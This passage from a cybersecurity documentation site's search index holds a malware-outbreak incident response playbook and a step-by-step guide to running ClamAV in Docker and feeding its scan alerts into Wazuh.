and get rid of Fireball, security researchers and antivirus software providers developed updates and removal tools. Campaigns were started to inform people about the dangers of bundled software.  ","version":"Next","tagName":"h3"},{"title":"3. Stakeholders​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#3-stakeholders","content":" Effective malware outbreak response requires collaboration among various stakeholders within and outside Redback Operations.  ","version":"Next","tagName":"h2"},{"title":"3.1 IT Security Team​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#31-it-security-team","content":" Lead: Daniel McAulay (Senior Project Leader)  The IT security team oversees protecting the company's digital assets, identifying security risks, and putting preventative and corrective measures in place for data breaches.  Responsibilities:  Analyzing security events to assess malware outbreak impact.Implementing security measures to prevent further unauthorized access.Collaborating with the incident response team to contain malware outbreaks.Conducting forensic investigations to identify root causes.Advising on incident response protocols and security improvements.  ","version":"Next","tagName":"h3"},{"title":"3.2 Incident Response Team​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#32-incident-response-team","content":" Lead: Devika Sivakumar (Blue Team Leader)  The incident response team is responsible for organising cleanup activities and overseeing the organization's reaction to malware outbreaks.  Responsibilities:  Assessing the extent of malware outbreaks.Assembling resources to mitigate the effects of malware attacks.Conducting forensic investigations for root cause analysis.Communicating response protocols and recovery efforts to stakeholders.Enhancing incident response capabilities based on lessons learned.  ","version":"Next","tagName":"h3"},{"title":"3.3 Communication Team​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#33-communication-team","content":" Lead: Kaleb Bowen (Company Lead)  The communication team oversees overseeing and guaranteeing clear and consistent message for both internal and external communications about malware outbreaks.  Responsibilities:  Creating communication plans to inform stakeholders about malware outbreaks.Drafting and distributing communication materials.Managing media relations to protect the organization's image.Providing regular updates on stakeholder engagement.  Collaboration Matrix:  IT Security Team: Response implementation and technical analysis.Incident Response Team: Coordination and execution of response actions.Communication Team: Information dissemination and media management.Senior Management: Decision-making and oversight.Legal and Compliance: Regulatory adherence and legal guidance.  ","version":"Next","tagName":"h3"},{"title":"3.4 Customers​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#34-customers","content":" Clients are people or groups that have a stake in the goods or services that the company provides and who could be impacted by malware outbreaks. Among their duties and functions are:  Notifying the company of any unauthorised or questionable conduct pertaining to their accounts or transactions. Supplying the incident response team with pertinent data or proof to aid in the investigation of malware outbreaks. Following the advice and directives of the organisation on safeguarding their personal information and lessening the effects of virus outbreaks.  ","version":"Next","tagName":"h3"},{"title":"3.5 Third-Party Vendors​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#35-third-party-vendors","content":" Third-party vendors are outside businesses that supply the company with goods, services, or support; they may also have access to its systems, networks, or data. Among their duties and functions are:  Working along with the company's incident response team to find and fix security flaws or breaches pertaining to their goods or services. Providing help and backing to the company as it investigates and resolves malware problems impacting its systems or networks. Meeting legal and contractual standards for data security and privacy, including reporting security breaches, and supporting incident response activities.  Communication Plan Template:  Internal: Immediate notification to IT Security and Incident Response Teams.External: Timely updates to customers and third-party vendors.Media: Press releases and statements to manage public relations.  ","version":"Next","tagName":"h3"},{"title":"RACI Chart​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#raci-chart","content":" Task/Activity\tIT Security Team\tIncident Response Team\tCommunication Team\tSenior Management\tLegal and Compliance\tCustomers\tThird-Party VendorsPreparation\tR, C\tA, R\tI\tI\tC\tI\tI Establishing incident response team\tA\tR\tI\tI\tC\tI\tI Developing malware response procedures\tA, R\tR, C\tI\tC\tC\tI\tI Conducting training and practice sessions\tA, R\tR\tI\tI\tI\tI\tI Implementing malware detection systems\tA, R\tR\tI\tI\tI\tI\tI Detection\tA, R\tR\tI\tI\tI\tI\tI Monitoring system logs and network traffic\tR\tA, R\tI\tI\tI\tI\tI Using IDS and SIEM tools\tA, R\tR\tI\tI\tI\tI\tI Analyzing alerts\tA, R\tR\tI\tI\tI\tI\tI Analysis\tA, R\tR\tI\tI\tI\tI\tI Collecting data for forensic analysis\tA, R\tR\tI\tI\tI\tI\tI Identifying attack methods\tA, R\tR\tI\tI\tI\tI\tI Determining impact\tA, R\tR\tI\tI\tI\tI\tI Containment\tA, R\tR\tI\tI\tI\tI\tI Isolating compromised systems\tA, R\tR\tI\tI\tI\tI\tI Implementing safeguards\tA, R\tR\tI\tI\tI\tI\tI Blocking malicious software\tA, R\tR\tI\tI\tI\tI\tI Eradication\tA, R\tR\tI\tI\tI\tI\tI Removing malicious software\tA, R\tR\tI\tI\tI\tI\tI Patching vulnerabilities\tA, R\tR\tI\tI\tI\tI\tI Updating security policies\tA, R\tR\tI\tI\tI\tI\tI Recovery\tA, R\tR\tI\tI\tI\tI\tI Restoring backups\tA, R\tR\tI\tI\tI\tI\tI Rebuilding systems\tA, R\tR\tI\tI\tI\tI\tI Conducting user awareness training\tA, R\tR\tI\tI\tI\tI\tI Post-Incident Review\tA, R\tR\tI\tI\tI\tI\tI Reviewing incident response process\tA, R\tR\tI\tI\tI\tI\tI Documenting best practices\tA, R\tR\tI\tI\tI\tI\tI Updating response procedures\tA, R\tR\tI\tI\tI\tI\tI Communication Plan\tC\tC\tA, R\tI\tC\tI\tI Creating communication plans\tC\tC\tA, R\tI\tC\tI\tI Drafting communication materials\tC\tC\tA, R\tI\tC\tI\tI Managing media relations\tC\tC\tA, R\tI\tC\tI\tI Providing updates\tC\tC\tA, R\tI\tC\tI\tI  Key:  R: Responsible (those who do the work)A: Accountable (those who are ultimately answerable)C: Consulted (those who provide input)I: Informed (those who are kept up to date)  Key Definitions:  Responsible (R): The individual(s) who perform the work to achieve the task.Accountable (A): The individual who is ultimately answerable for the correct and thorough completion of the task.Consulted (C): The individual(s) whose opinions are sought.Informed (I): The individual(s) who are kept up to date on progress and outcomes.  ","version":"Next","tagName":"h3"},{"title":"4. Flow Diagram​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#4-flow-diagram","content":"   Preparation (Prep): Yellow  Notify Incident Response Team: To begin incident response preparations, the incident response team is notified as soon as a malware outbreak is discovered.  Identification (Identify): Red  Contain the Outbreak; Isolate Affected Systems: To stop more unauthorised access, steps are made to isolate compromised systems and limit the outbreak.  Notification (Notif): Violet  Change Credentials; Perform Malware Scan: To mitigate the effect of the outbreak, malware scans and password changes are made.Analyse Malicious Activities; Notify Stakeholders: Malicious activity is found through additional analysis, and stakeholders are informed to plan reaction actions.  Containment (Contain): Sky Blue  Error - Unable to Isolate; Escalate to Senior Management: Senior management is notified of the issue for resolution if the impacted systems cannot be isolated.  Eradication (Erad): Light Green  Document Incident Details; Eradicate Malware: To remove the danger, malware removal processes are carried out and incident facts are logged.  Recovery (Recover): Brown  Monitor for Further Activity; Initiate Recovery Procedures: To restore regular operations, recovery steps are started, and ongoing monitoring is carried out for any new malware activity.  Post-Incident Actions (Post): Light pink  Continue Monitoring for Threats; Conduct Post-Incident Review: In addition to ongoing threat detection, a post-event evaluation is carried out to assess the response's efficacy and pinpoint areas in need of development.  ","version":"Next","tagName":"h2"},{"title":"5. Incident Response Stages​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#5-incident-response-stages","content":" ","version":"Next","tagName":"h2"},{"title":"5.1 Preparation​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#51-preparation","content":" Objective: Establishing the policies, procedures, and assets necessary to effectively manage malware outbreaks is the primary objective of the preparation stage. Activities: Assembling an incident response team with distinct responsibilities.Developing crisis response procedures and plans that incorporate communication protocols and escalation pathways.Ensuring readiness by regularly training and practicing incident responses.Putting in place surveillance systems and security measures to find and stop malware outbreaks. Outcome: A fully prepared business with the ability to respond quickly and effectively to malware outbreaks.  ","version":"Next","tagName":"h3"},{"title":"5.2 Detection​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#52-detection","content":" Objective: The goal of the detection stage is to look for indications of malware outbreaks or illegal access to the networks and systems of the company. Activities: Keeping an eye out for questionable activity, such strange access patterns, or illegal file transfers, by examining system records and network traffic.Using intrusion detection systems (IDS) and security information and event management (SIEM) tools to find any assaults.Examining anomalies and alerts to distinguish between dangerous and acceptable activity. Outcome: Early malware outbreak identification enables rapid reaction and mitigation measures.  ","version":"Next","tagName":"h3"},{"title":"5.3 Analysis​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#53-analysis","content":" Objective: Finding out and understanding the nature and scope of the malware epidemic occurrence are the main goals of the analysis stage. Activities: Collecting data and using forensic analysis to identify the source and extent of the malware infestation.Analysing systems and networks that have been compromised to determine attack tactics and the effects on compromised data.Identifying the indications of compromise (IOCs) and strategies, methods, and procedures (TTPs) of threat actors. Outcome: A comprehensive comprehension of the malware outbreak, considering the causes, effects, and attribution of the outbreak.  ","version":"Next","tagName":"h3"},{"title":"5.4 Containment​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#54-containment","content":" Objective: The containment stage stops future unauthorised access or leakage of information to mitigate the effect and spread of the event. Activities: Dividing vulnerable computers and networks to stop attackers from spreading laterally.Putting in place safeguards and access limits to stop illegal access to private data.Containing or obstructing dangerous software, data, or network traffic to stop more harm. Outcome: Effective handling of the malware breakout incident, minimising the harm done to the organization's data and systems.  ","version":"Next","tagName":"h3"},{"title":"5.5 Eradication​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#55-eradication","content":" Objective: The goal of the eradication phase is to eliminate the attackers from the company's networks and IT infrastructure, along with any hazards or vulnerabilities that may still exist. Activities: Eradicating bad software and data and returning hacked machines to a safe configuration.Repairing or updating software and systems that are susceptible to attack to stop future exploitation.Examining and amending security procedures and policies to fix any vulnerabilities or faults found. Outcome: Removing all traces of the malware breakout event and cutting down on vulnerabilities to stop future occurrences of this kind.  ","version":"Next","tagName":"h3"},{"title":"5.6 Recovery​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#56-recovery","content":" Objective: The goal of the recovery stage is to get the affected systems and data back to normal and to start doing business as usual. Activities: Restoring corrupted systems as well as information backups to guarantee information accessibility and integrity.Rebuilding or rearranging systems and networks to improve security and stop such incidents in the future.Putting in place initiatives for user awareness and education to stop malware outbreaks in the future. Outcome: Complete recovery of services and operations, along with stronger safety protocols to reduce the probability of a repeat.  ","version":"Next","tagName":"h3"},{"title":"5.7 Post- Incident Review​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#57-post--incident-review","content":" Objective: The company assesses its reaction to the malware outbreak issue during the post-incident assessment phase, looking for areas for improvements and lessons learnt. Activities: Completing a thorough analysis of the incident response procedure, considering its advantages, disadvantages, and potential areas of development.Recording best practices and lessons discovered to improve future incident response capabilities.Modifying incident response procedures, policies, and security setups considering the review's conclusions. Outcome: Enhancing incident response skills and preparing for any malware outbreaks in the future.  ","version":"Next","tagName":"h3"},{"title":"6. Steps for Monitoring Threats​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#6-steps-for-monitoring-threats","content":" ","version":"Next","tagName":"h2"},{"title":"6.1 Establish a Monitoring Strategy​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#61-establish-a-monitoring-strategy","content":" Objective: Create and put into action a thorough plan for ongoing threat surveillance that focuses on malware outbreaks. Activities: Objectives: Clearly state the goals of threat monitoring, including spotting malware infections, seeing illegal access, and keeping an eye on strange network activity that could be a sign of malicious activity.Tools: Choose the right security technologies, such as anti-malware software, SIEM (Security Information and Event Management) systems, EDR (Endpoint Detection and Response) solutions, and IDS/IPS (Intrusion Detection/Prevention Systems).Baselines: Create baselines for typical system behaviour, user activity, and network traffic patterns to spot any variations that could point to the existence of malware. Outcome: A clear monitoring plan that supports Redback Operations objectives and improves the capacity to identify and address malware threats.  ","version":"Next","tagName":"h3"},{"title":"6.2 Deploy Monitoring Solutions​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#62-deploy-monitoring-solutions","content":" Objective: Install and set up monitoring technologies throughout the infrastructure of the company to identify any malware threats. Activities: Install and Configure Tools: Distribute the chosen monitoring tools to endpoints, systems, and networks. Make sure they are set up to identify actions connected to malware and gather relevant data.Integrate with Threat Intelligence: Combine threat information feeds with monitoring technologies to improve the identification of both established and new malware threats.Enable Logging: Verify that logging is turned on for all important networks, systems, and applications. Log collecting should be centralised for effective analysis and correlation. Outcome: Comprehensive deployment and integration of monitoring solutions providing detailed insights into potential malware threats.  ","version":"Next","tagName":"h3"},{"title":"6.3 Continuous Monitoring and Analysis​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#63-continuous-monitoring-and-analysis","content":" Objective: Continue investigation and monitoring to quickly identify and address malware risks. Activities: Real-Time Monitoring: IIn order to enable the prompt identification of malware activity, utilise real-time monitoring to continually examine user actions, system behaviour, and network traffic.Anomaly Detection: Make use of machine learning and behavioural analytics to spot abnormalities and departures from predetermined baselines that could point to the existence of malware.Correlate Events: Connect events from different sources to find trends that could point to well-planned malware assaults or enduring dangers. Outcome: Enhanced capability to detect malware threats promptly, enabling swift response to mitigate potential impacts.  ","version":"Next","tagName":"h3"},{"title":"6.4 Alerting and Notification​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#64-alerting-and-notification","content":" Objective: Use a strong alerting system to guarantee prompt and efficient reaction to risks that are identified. Activities: Set Alert Thresholds: Determine thresholds according to probable effect and severity for various alert kinds.Automated Alerts: Set up automatic alerts to inform the security team of any malware dangers found. Make sure warnings have enough context to allow for quick assessment and response.Prioritize Alerts: Establish a method to rank warnings according to their seriousness and possible consequences, concentrating on the most urgent dangers first. Outcome: Prompt and efficient handling of malware threats identified, lowering the possibility of serious harm.  ","version":"Next","tagName":"h3"},{"title":"6.5 Investigate and Respond​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#65-investigate-and-respond","content":" Objective: To reduce the threat of detected malware, carry out in-depth investigations and put the necessary measures into place. Activities: Initial Triage: To confirm the veracity and possible significance of warnings, carry out preliminary triage. Assess the threat's seriousness and determine if the warning is a false positive.Detailed Analysis: To determine the kind and scope of the malware threat, thoroughly examine verified warnings. To get data and locate the threat's origin, employ forensic instruments and methods.Containment and Eradication: If a danger is confirmed, start containment procedures to stop more harm. To get rid of the virus from the environment, carry out the required eradication processes. Outcome: Efficient examination and reduction of malware hazards, guaranteeing little influence on the establishment.  ","version":"Next","tagName":"h3"},{"title":"6.6 Post-Incident Review​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#66-post-incident-review","content":" Objective: Evaluate the response's efficacy and pinpoint areas in need of development. Activities: Document Findings: Keep a record of the whole occurrence, including the steps taken for identification, analysis, and reaction.Review and Improve: Examine the monitoring and reaction procedures after the event to find areas of improvement and lessons discovered.Update Monitoring Tools: To improve threat detection and response capabilities in the future, update monitoring tools, setups, and thresholds in light of the findings. Outcome: Processes for incident response and threat monitoring are continuously improved, guaranteeing increased readiness for malware outbreaks in the future.  ","version":"Next","tagName":"h3"},{"title":"6.7 Continuous Improvement​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#67-continuous-improvement","content":" Objective: Preserve and improve the tools and approach used by the organisation for threat monitoring. Activities: Regular Audits: To make sure monitoring techniques and technologies are still relevant and effective in light of emerging dangers, conduct audits on a regular basis.Training and Awareness: Continually train security staff on the newest risks and optimal techniques for observation and reaction.Adapt to New Threats: Make constant adjustments to the monitoring plan to handle new risks. Keep up with the most recent threat intelligence and apply it to your monitoring procedures. Outcome: A proactive, flexible approach to threat monitoring those changes as the environment around threats does.  ","version":"Next","tagName":"h3"},{"title":"7. Terminology​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#7-terminology","content":" Malware Outbreak: A circumstance in which malicious software quickly spreads throughout the computers, networks, or devices of a company, usually with the goal of stealing, disrupting, or infiltrating data. Indicators of Compromise (IOCs): Indications of potentially harmful activity that may be seen in an organization's IT infrastructure and that point to the existence of malware, or a security breech connected to the outbreak. Incident Response: A methodical and structured process for locating, controlling, and lessening the damage that a malware outbreak does to an organization's IT infrastructure to reduce interruption and get things back to normal. Forensic Analysis: The careful inspection and evaluation of digital evidence associated with the malware outbreak, including system artefacts, malware samples, and network logs, to determine the origin of the attack, gauge its scope, and provide proof for legal or investigative needs. Security Controls: Defensive measures and protections, including as firewalls, antivirus software, intrusion detection systems (IDS), and endpoint protection solutions, put in place to identify, stop, and reduce the impact of a malware outbreak. Vulnerability: Vulnerabilities or holes in a company's networks, apps, or IT systems that might be used by malware to propagate, get improper access, or do damage. Preventing and managing malware outbreaks requires the identification and patching of vulnerabilities. Phishing: A popular attack vector that hackers employ to fool people into disclosing private information, including passwords, usernames, and financial information. This is frequently done through fake emails, websites, or texts. Phishing assaults have the potential to spread malware and start an outbreak of the infection inside a company. TTPs: Tactics, Techniques, and Procedures used by threat actors. SIEM: Security Information and Event Management tools. IDS: Intrusion Detection Systems. Zero-Day Exploit: An attack that targets a previously unknown vulnerability. ","version":"Next","tagName":"h2"},{"title":"ClamAV and Wazuh Integration","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/ClamAV-Integration","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"ClamAV and Wazuh Integration","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/ClamAV-Integration#1-introduction","content":" This document provides a brief overview of ClamAV and the rationale behind integrating it with Wazuh on Redback Operations' VM. Additionally, this document will provide step-by-step instructions to show how future users can understand, maintain and improve the integration. It will also describe limitations and future work directions.  ","version":"Next","tagName":"h2"},{"title":"2. Background​","type":1,"pageTitle":"ClamAV and Wazuh Integration","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/ClamAV-Integration#2-background","content":" Redback Operations currently lacks a comprehensive malware detection solution for its virtualised environment. Given that numerous web applications store files on the virtual machine, and remote users can access and download files, a lack of malware detection presents some security concerns.  In previous work, VirusTotal and Wazuh integration was investigated with a focus on monitoring key system directories. However, due to API limitations, this solution is incompatible as a widespread solution for Redback Operations' environment. Consequently, research was done on other alternatives, such as ClamAV.  ClamAV is a popular open-source anti-malware solution for Linux and Windows systems. It uses a large signature database maintained by Cisco to detect threats. ClamAV can also perform system-wide scanning without any API restrictions, making it a suitable alternative to VirusTotal. Finally, ClamAV logs can easily be parsed by Wazuh, meaning that anti-virus alerts can be monitored through the Wazuh dashboard.  Alternatives to ClamAV were explored. Nevertheless, the range of anti-malware solutions for Linux is small, and most require a paid subscription (e.g. Sophos Protection for Linux). Since ClamAV is the most popular solution, and supports easy integration with Wazuh, ClamAV is the most appropriate solution to investigate.  ","version":"Next","tagName":"h2"},{"title":"3. Proposal​","type":1,"pageTitle":"ClamAV and Wazuh Integration","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/ClamAV-Integration#3-proposal","content":" For security reasons, it is proposed that ClamAV be deployed via a Docker container. To ensure that no data can be modified, key directories will be mounted with read-only access. Moreover, this avoids dependency issues with applications running on the VM.  In terms of scanning, active scanning (real-time monitoring) of key directories was investigated. However, this is incompatible with the Docker architecture and would involve giving ClamAV root permissions, which is a security issue. Moreover, the performance of the VM would be negatively impacted. As such, instead, ClamAV will be set up to perform recurring system scanning on key directories every 12 hours. This functionality can be implemented easily using Cronjobs.  The remainder of this document will describe exactly how ClamAV can be set up.  ","version":"Next","tagName":"h2"},{"title":"4. Configuration Steps​","type":1,"pageTitle":"ClamAV and Wazuh Integration","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/ClamAV-Integration#4-configuration-steps","content":" ","version":"Next","tagName":"h2"},{"title":"4.1. Installing ClamAV Docker Container​","type":1,"pageTitle":"ClamAV and Wazuh Integration","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/ClamAV-Integration#41-installing-clamav-docker-container","content":" Pull the official latest container using docker pull clamav/clamav:latest_base. This version does not come pre-installed with a virus database. Instead, it is expected that the virus database is persisted on the host machine via a volume. That way, every time you run the container, you do not have to download the database. When the container runs, it will automatically install the virus database.    ","version":"Next","tagName":"h3"},{"title":"4.2. Creating Persistent Volumes​","type":1,"pageTitle":"ClamAV and Wazuh Integration","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/ClamAV-Integration#42-creating-persistent-volumes","content":" Create a volume for the virus database, using docker volume create clam_db. Create a volume for the ClamAV configuration files too.      ","version":"Next","tagName":"h3"},{"title":"4.3. Identifying Writable Directories​","type":1,"pageTitle":"ClamAV and Wazuh Integration","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/ClamAV-Integration#43-identifying-writable-directories","content":" Before starting the ClamAV container, you need to identify which directories you want to monitor. A simple way of doing this is looking for all user-writable (non-root) directories. Use the command find / -writable -type d 2&gt;&amp;1 | grep -v &quot;Permission denied&quot;. Here is a preview of some results you will see.    After parsing through the results, you will see many directories that are not unique to your user. These are /dev/mqueue, /dev/shm, /var/crash, /run/screen, and /run/lock. There are also common examples like /var/tmp, /tmp, and /home (this is the users' directory). Finally, you also want to monitor the volumes directory where all the container data is stored (such as the Streamlit file upload web app). This is at /var/lib/docker/volumes. With the exception of the volumes directory, the goal is to monitor all non-root directories where normal users can write files to, and perhaps hide payloads. Moreover, it also avoids performing a full-system scan, which would take up many resources.  ","version":"Next","tagName":"h3"},{"title":"4.4. Starting the Container​","type":1,"pageTitle":"ClamAV and Wazuh Integration","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/ClamAV-Integration#44-starting-the-container","content":" Before using Cronjobs to automate the scanning process, let us demonstrate how you can start up the container manually. Here is the code:  docker run -d --rm \\ --name &quot;clam_container_01&quot; \\ --log-driver=syslog \\ --log-opt tag=&quot;clamd&quot; \\ --mount source=clam_db,target=/var/lib/clamav \\ --mount source=clam_conf,target=/etc/clamav \\ --mount type=bind,source=/home,target=/to_scan/home,readonly \\ --mount type=bind,source=/var/tmp,target=/to_scan/var/tmp,readonly \\ --mount type=bind,source=/tmp,target=/to_scan/tmp,readonly \\ --mount type=bind,source=/var/lib/php/sessions,target=/to_scan/var/lib/php/sessions,readonly \\ --mount type=bind,source=/var/crash,target=/to_scan/var/crash,readonly \\ --mount type=bind,source=/run/screen,target=/to_scan/run/screen,readonly \\ --mount type=bind,source=/run/lock,target=/to_scan/run/lock,readonly \\ --mount type=bind,source=/dev/mqueue,target=/to_scan/dev/mqueue,readonly \\ --mount type=bind,source=/dev/shm,target=/to_scan/dev/shm,readonly \\ --mount type=bind,source=/var/lib/docker/volumes,target=/to_scan/var/lib/docker/volumes,readonly \\ clamav/clamav:latest_base   The -d flag starts the container as a background process, and --rm removes the container in case it is stopped (to avoid having lingering containers stored with the same name). The --log-driver parameter ensures that the container's internal logs are stored and parsed via the host's syslog process. This is used to capture the ClamAV virus scans and save them on the host. Then, --log-opt sets the program logs of the container to be &quot;clamd&quot;. This ensures that logs coming from the container are called &quot;clamd&quot;, which is needed for the Wazuh decoders.  As mentioned before, we mount the volumes against the database and configuration directories of the container. We also explicitly mount each of the target directories into a subdirectory of /to_scan in the container as readonly. This way, internally, ClamAV can access the directories and only scan them.    Note: You need to modify the clam.conf file under /var/lib/docker/volumes/clam_conf/_data/ and increase the MaxDirectoryRecursion variable to 20. Otherwise, you will experience scanning errors when running ClamAV.    ","version":"Next","tagName":"h3"},{"title":"4.5. Performing Basic Scanning​","type":1,"pageTitle":"ClamAV and Wazuh Integration","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/ClamAV-Integration#45-performing-basic-scanning","content":" After starting the container, there are two ways to perform scanning: with clamscan or clamdscan. The first option, clamscan, works independently from the clamd daemon and loads the virus database on its own. On the other hand, clamdscan relies on the clamd daemon to load the virus database and perform faster scanning. Moreover, clamdscan supports multi-threaded scanning. Since we are starting the container, which already runs clamd, it makes more sense to run clamdscan.  Note: clamd takes about 20 seconds to start up, once the container is started. You need to wait this period BEFORE running clamdscan, or else the tool will not work.  For a basic scan, run docker exec container_name clamdscan --fdpass /directory. For a more concrete example, see the below screenshot. We use --fdpass to pass in the file descriptors for privileged files (thus avoiding privilege errors) and, for a quick example, we pass in the /to_scan/var/tmp directory, which is mapped to the host's /var/tmp directory. This has an EICAR executable in it. Note that by default, clamdscan performs recursive scanning, so you only need to pass in a top-level directory.  You will see a virus detected message. This message, via the syslog driver, will be sent to the host journald service, which Wazuh automatically monitors.    Over on the Wazuh Threat Hunting dashboard, we can see the corresponding alert.    However, beyond the virus alert, there are also other ClamAV alerts mistakenly marked as virus alerts, when they are just for normal container stdout messages. This requires the decoder to be refined.    ","version":"Next","tagName":"h3"},{"title":"4.6. Refining the ClamAV Decoder​","type":1,"pageTitle":"ClamAV and Wazuh Integration","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/ClamAV-Integration#46-refining-the-clamav-decoder","content":" Note that earlier, we created the Docker container using the &quot;syslog&quot; plugin, and the name of &quot;clamd&quot;. Since we are using a container architecture, the syslog logs would usually have the program name tied to the container ID, instead of &quot;clamd&quot;. The decoder that Wazuh uses for ClamAV only monitors logs that have the &quot;clamd&quot; program name attached to them. Hence, we had to add the &quot;clamd&quot; name to the container.  One unintended consequence of this, however, is that all logs from the container get marked as from &quot;clamd&quot;, even those that do not show any anti-virus scan logs. Thus, you are seeing those logs pop up in the Wazuh dashboard.  See the decoder below, available under /var/ossec/ruleset/decoders/0075-clamav_decoders.xml in the Wazuh manager container. Note that it parses logs with the program name &quot;clamd&quot;, and the child decoder further matches lines with the &quot;FOUND&quot; string, case insensitive. Now, note from the previous detection logs that they always had a &quot;FOUND&quot; string in capslock. Hence, if we modified this decoder to instead look for case sensitive &quot;FOUND&quot; strings, we could just filter out the detection logs.    Following through with that logic, we will create a custom decoder file. Copy the contents of 0075-clamav_decoders.xml into the /var/lib/docker/volumes/single-node_wazuh_etc/_data/decoders directory on the host. Note the additional new line. This uses PCRE2 to match the FOUND string, case sensitive.    Then, we need to make the Wazuh Manager use this decoder instead of the old one. Modify the wazuh_manager.conf file of the server at /home/ben/wazuh-docker/single-node/config/wazuh_cluster/wazuh_manager.conf. Add the highlighted exclusion line and restart the Wazuh Manager container. Afterwards, you should only see virus alert notifications on the Wazuh dashboard.    ","version":"Next","tagName":"h3"},{"title":"4.7. Automated Scanning​","type":1,"pageTitle":"ClamAV and Wazuh Integration","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/ClamAV-Integration#47-automated-scanning","content":" After setting everything up, you can manually scan files and directories for malware. To automate this process, you can create a Cronjob to automatically execute a script every, say, 12 hours.  Here is a script you can use. It checks if the ClamAV container exists and stops it if necessary. Then, it executes the previous Docker command, and waits 20 seconds for the container to start up. Then, it runs clamdscan with the -w and -m parameters on the entire scanning directory. The -w parameter ensures that clamdscan waits up to 30 seconds in case the container has not started up, while -m enables multi-threaded scanning. The script stops the container after it has run to avoid using up resources.  Note that every time the container is started, it will check for an updated signature database.    Using crontab -e, create a new Cronjob that runs the script every 12 hours.  ⚠️ Warning: you need to regularly check the scan results to ensure that the logs of ClamAV are being processed. If they are not being processed for some reason, restart the Wazuh agent.  ","version":"Next","tagName":"h3"},{"title":"5. Final Thoughts​","type":1,"pageTitle":"ClamAV and Wazuh Integration","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/ClamAV-Integration#5-final-thoughts","content":" In this guide, we successfully implemented ClamAV across the company VM's critical directories. However, there are some considerations that could be included in future work.  On Linux, ClamAV is limited to file scanning, using features like heuristics and signatures. Unlike 